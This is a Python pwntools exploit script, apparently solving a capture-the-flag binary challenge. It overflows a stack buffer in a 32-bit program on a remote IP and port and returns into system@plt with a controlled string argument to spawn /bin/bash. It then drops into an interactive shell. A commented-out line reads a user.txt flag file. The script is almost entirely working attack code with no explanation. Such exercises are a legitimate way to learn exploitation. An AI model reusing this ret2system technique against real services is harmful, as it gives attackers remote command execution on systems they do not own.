import pwn
from sys import argv

pwn.context.log_level = 'debug'
pwn.context.terminal = ['tmux', 'splitw', '-h']
elf = pwn.ELF('./dist/chall_32')
# p = pwn.process('./dist/chall_32')
"""
pwn.gdb.attach(p, '''
set pagination off
set disassembly-flavor intel
define hook-stop
echo ****************************************************\\n
echo ====================info register===================\\n
info register
echo ================32 word hex of RSP==================\\n
x/32wx $esp
echo ================next 5 instruction==================\\n
x/5i $eip
echo ================16 word hex of RBP==================\\n
x/16wx $ebp
echo ****************************************************\\n
end
b*0x0804930b
b*0x8049248
c
''')
"""
p=pwn.remote("34.150.35.67",30605)
global_talk = elf.symbols['talk']
talking = elf.symbols['talking']
run = elf.symbols['run']
system=elf.plt['system']


payload = b'A' * 16 + b'jkaw'+b'A'*12 + pwn.p32(talking)+pwn.p32(system)+b'A'*4+pwn.p32(global_talk)

p.sendlineafter('Hell....Hel....He...H.........', payload)
p.sendlineafter('tell me something',"/bin/bash")
#p.sendlineafter('$','cat /home/user.txt')
p.interactive()